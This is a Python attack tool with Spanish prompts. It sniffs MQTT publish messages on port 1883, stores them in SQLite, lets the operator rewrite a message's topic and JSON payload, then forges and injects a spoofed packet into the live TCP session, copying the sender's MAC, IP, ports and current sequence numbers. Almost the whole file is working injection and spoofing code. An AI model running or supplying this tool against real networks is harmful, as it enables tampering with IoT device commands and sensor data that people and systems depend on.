import sqlite3
import json
import time
from scapy.all import sniff, Ether, IP, TCP, sendp, get_if_list
from tabulate import tabulate

DB_PATH = "mqtt_spoofer.db"
captured = []

def listar_interfaces():
    interfaces = get_if_list()
    tabla = [[i, iface] for i, iface in enumerate(interfaces)]
    print(tabulate(tabla, headers=["#", "Interfaz"], tablefmt="grid"))
    idx = int(input("Selecciona la interfaz de red a usar: "))
    return interfaces[idx]

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS captured_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            src_mac TEXT, dst_mac TEXT,
            src_ip TEXT, dst_ip TEXT,
            src_port INTEGER, dst_port INTEGER,
            topic TEXT, payload TEXT,
            raw BLOB
        )
    """)
    conn.commit()
    return conn

def parse_mqtt(pkt, conn):
    if not (pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return
    raw = bytes(pkt[TCP].payload)
    if len(raw) < 4 or (raw[0] >> 4) != 3:
        return

    fixed_header = raw[0]
    is_editable = (fixed_header >> 4) == 3
    index = 1
    multiplier = 1
    remaining_length = 0
    while True:
        if index >= len(raw): return
        byte = raw[index]
        remaining_length += (byte & 127) * multiplier
        index += 1
        if byte & 128 == 0:
            break
        multiplier *= 128

    topic_len = int.from_bytes(raw[index:index+2], 'big')
    topic_start = index + 2
    topic_end = topic_start + topic_len
    topic = raw[topic_start:topic_end].decode(errors='ignore')

    qos = (fixed_header & 0b00000110) >> 1
    pid_bytes = b""
    pid_offset = topic_end
    if qos > 0:
        pid_bytes = raw[topic_end:topic_end+2]
        pid_offset += 2

    payload_bytes = raw[pid_offset:]
    payload = payload_bytes.decode(errors='ignore')

    captured.append({
        "pkt": pkt,
        "raw": raw,
        "index": index,
        "topic_offset": topic_start,
        "topic_len": topic_len,
        "pid_offset": pid_offset if qos > 0 else None,
        "payload_offset": pid_offset,
        "src_mac": pkt[Ether].src,
        "dst_mac": pkt[Ether].dst,
        "src_ip": pkt[IP].src,
        "dst_ip": pkt[IP].dst,
        "src_port": pkt[TCP].sport,
        "dst_port": pkt[TCP].dport,
        "fixed_header": fixed_header,
        "qos": qos,
        "topic": topic,
        "payload": payload,
        "editable": is_editable
    })

    conn.execute("INSERT INTO captured_messages (src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, topic, payload, raw) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
        (pkt[Ether].src, pkt[Ether].dst, pkt[IP].src, pkt[IP].dst,
         pkt[TCP].sport, pkt[TCP].dport, topic, payload, raw))
    conn.commit()

def editar_topic(topic_str):
    partes = topic_str.split('/')
    print("\n[EDICIÓN DE TOPIC]")
    nuevas = [input(f"{i+1}. {parte} → ") or parte for i, parte in enumerate(partes)]
    return '/'.join(nuevas)

def editar_payload(payload_str):
    inicio_json = payload_str.find('{')
    if inicio_json == -1:
        print("[!] No se encontró JSON en el payload.")
        return payload_str
    try:
        data = json.loads(payload_str[inicio_json:])
    except json.JSONDecodeError:
        print("[!] JSON inválido.")
        return payload_str
    print("\n[EDICIÓN DE PAYLOAD]")
    for k in data:
        original = data[k]
        nuevo = input(f"{k} = {original} → ") or original
        try:
            if isinstance(original, int): nuevo = int(nuevo)
            elif isinstance(original, float): nuevo = float(nuevo)
            elif isinstance(original, bool): nuevo = nuevo.lower() in ['true','1','yes']
        except: pass
        data[k] = nuevo
    return json.dumps(data)

def encode_remaining_length(length):
    out = bytearray()
    while True:
        encoded = length % 128
        length //= 128
        if length > 0:
            encoded |= 0x80
        out.append(encoded)
        if length == 0:
            break
    return out

def spoof_and_send(sel, iface):
    msg = captured[sel]
    if not msg.get("editable", False):
        print("[!] Este mensaje no es modificable.")
        return

    topic_new = editar_topic(msg['topic'])
    payload_new = editar_payload(msg['payload'])

    print("[*] Esperando paquete TCP real para sincronizar secuencia...")
    seq_ref = ack_ref = None

    def sync(pkt):
        nonlocal seq_ref, ack_ref
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            if (pkt[IP].src == msg['src_ip'] and pkt[IP].dst == msg['dst_ip'] and
                pkt[TCP].sport == msg['src_port'] and pkt[TCP].dport == msg['dst_port']):
                seq_ref = pkt[TCP].seq + len(pkt[TCP].payload)
                ack_ref = pkt[TCP].ack
                return True
        return False

    sniff(filter=f"tcp and src host {msg['src_ip']} and dst host {msg['dst_ip']} and port {msg['dst_port']}",
          iface=iface, prn=lambda x: None, stop_filter=sync, timeout=5)

    if seq_ref is None:
        print("[!] No se pudo sincronizar con un paquete real.")
        return

    topic_bytes = topic_new.encode()
    topic_len = len(topic_bytes).to_bytes(2, 'big')
    payload_bytes = payload_new.encode()

    variable = topic_len + topic_bytes
    if msg['qos'] > 0:
        variable += msg['raw'][msg['topic_offset']+msg['topic_len']:msg['topic_offset']+msg['topic_len']+2]
    mqtt_payload = variable + payload_bytes
    remaining = encode_remaining_length(len(mqtt_payload))

    full_mqtt = bytes([msg['fixed_header']]) + bytes(remaining) + mqtt_payload

    forged = Ether(src=msg['src_mac'], dst=msg['dst_mac']) / \
             IP(src=msg['src_ip'], dst=msg['dst_ip']) / \
             TCP(sport=msg['src_port'], dport=msg['dst_port'],
                 flags='PA', seq=seq_ref, ack=ack_ref) / \
             full_mqtt

    sendp(forged, iface=iface, verbose=0)
    print("\n[✓] Spoof enviado correctamente con solo topic/payload modificados.")

if __name__ == "__main__":
    iface = listar_interfaces()
    conn = init_db()
    tiempo = int(input("¿Cuántos segundos deseas capturar mensajes MQTT? [default 30]: ") or 30)
    print(f"\n[*] Capturando durante {tiempo} segundos en {iface} (puerto 1883)...")
    end_time = time.time() + tiempo
    while time.time() < end_time:
        sniff(filter="tcp port 1883", iface=iface, prn=lambda pkt: parse_mqtt(pkt, conn), timeout=1)
    print("[✓] Captura completada.")

    if not captured:
        print("[!] No se capturaron mensajes.")
        exit(0)

    tabla = [[i, x['src_ip'], x['topic'], x['payload'], "✔" if x['editable'] else "✖"]
             for i, x in enumerate(captured)]
    print(tabulate(tabla, headers=["#", "IP", "Topic", "Payload", "Editable"], tablefmt="fancy_grid"))

    sel = int(input("\nSelecciona el mensaje a modificar y reenviar: "))
    spoof_and_send(sel, iface)
